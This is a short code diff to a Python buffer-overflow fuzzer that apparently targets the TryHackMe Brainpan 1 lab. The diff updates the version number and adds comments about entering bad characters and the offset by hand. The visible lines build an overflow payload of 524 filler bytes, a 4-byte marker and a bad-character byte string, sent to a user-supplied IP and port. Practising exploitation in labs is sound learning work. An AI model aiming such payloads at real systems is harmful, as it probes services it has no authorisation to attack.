@@ -12,7 +12,7 @@ def display_banner():
     """
     print(banner)
     print("Author  : Ox1d3x3")
-    print("Version : 0.8")
+    print("Version : 0.9")
     print("Disclaimer: This fuzzer is made based on THM Brainpan 1 room.\n")
 
 def get_target_info():
@@ -29,7 +29,7 @@ def main():
 
     # Get user input for IP and port
     target_ip, target_port = get_target_info()
-
+#Manually input badchars here
     badchars = (
         "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
         "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -50,7 +50,7 @@ def main():
     )
 
     print("\n[!] Using hardcoded bad characters")
-
+#Manually input buffer offset here
     try:
         buffer = "A" * 524 + "B" * 4
         payload = buffer + badchars + '\r\n'
